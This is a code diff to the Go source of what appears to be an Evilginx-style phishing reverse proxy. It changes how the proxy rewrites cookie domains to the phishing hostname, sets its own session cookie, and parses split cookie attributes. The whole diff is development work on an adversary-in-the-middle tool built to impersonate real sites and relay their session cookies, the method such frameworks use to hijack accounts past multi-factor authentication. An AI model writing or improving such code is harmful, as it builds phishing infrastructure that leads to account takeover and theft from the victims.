@@ -1333,10 +1333,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// handle session
 			ps := ctx.UserData.(*ProxySession)
-			var ck *http.Cookie
+			var sessionCk *http.Cookie
 			if ps.SessionId != "" {
 				if ps.Created {
-					ck = &http.Cookie{
+					sessionCk = &http.Cookie{
 						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
 						Value:   ps.SessionId,
 						Path:    "/",
@@ -1485,12 +1485,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 
-					// 如果 cookie 的 Domain 为空，设置为当前请求的 hostname
-					if ck.Domain == "" {
-						ck.Domain = req_hostname
-					} else {
-						ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
-					}
+					// 尝试替换 cookie 的 Domain（如果为空则保持为空）
+					ck.Domain, _ = p.replaceHostWithPhished(ck.Domain)
 					cookieStr := ck.String()
 					// 如果原始 cookie 包含 Partitioned 属性，追加到重新生成的 cookie 字符串
 					if hasPartitioned {
@@ -1498,6 +1494,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 					resp.Header.Add("Set-Cookie", cookieStr)
 				}
+			}
+
+			if sessionCk != nil && sessionCk.String() != "" {
+				resp.Header.Add("Set-Cookie", sessionCk.String())
 			}
 
 			// modify received body
@@ -2723,12 +2723,12 @@ func (p *HttpProxy) mergeSplitCookies(rawCookies []string) []string {
 			// 这是属性，附加到当前 cookie
 			// 将 domain=xxx 转换为 ; Domain=xxx
 			parts := strings.SplitN(raw, "=", 2)
-			if len(parts) == 2 {
-				attrName := strings.Title(strings.ToLower(parts[0]))
+			if len(parts) == 2 && len(parts[0]) > 0 {
+				attrName := strings.ToUpper(parts[0][:1]) + parts[0][1:]
 				currentCookie += "; " + attrName + "=" + parts[1]
-			} else {
+			} else if len(raw) > 0 {
 				// Secure, HttpOnly 等没有值的属性
-				attrName := strings.Title(strings.ToLower(raw))
+				attrName := strings.ToUpper(raw[:1]) + raw[1:]
 				currentCookie += "; " + attrName
 			}
 		} else {
